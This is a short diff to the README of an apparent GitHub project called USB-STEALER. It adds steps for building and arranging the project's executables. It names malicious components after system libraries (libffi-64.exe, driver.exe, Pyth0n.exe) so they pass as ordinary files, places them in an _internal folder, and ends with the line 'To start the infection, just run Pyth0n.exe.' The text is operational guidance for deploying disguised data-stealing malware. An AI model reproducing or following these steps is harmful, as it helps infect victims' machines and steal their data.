@@ -62,6 +62,8 @@ install >> libffi-13.exe
 
 autodestroy >> libffi-14.exe
 
+UID-generator >> libffi-64.exe
+
 then use ps1 to exe to convert the autodestroy.ps1 file and rename it to driver.exe. your project should look like this:
 
 ![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/e73ba36d-5be8-46eb-804c-4ee2f7a04b99)
@@ -74,6 +76,7 @@ in folder shorcut :
 
 ![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/a0984953-cb11-4463-a2f9-048302c97827)
 
+move libffi-64.exe to _internal
 
 To start the infection, just run Pyth0n.exe.
 
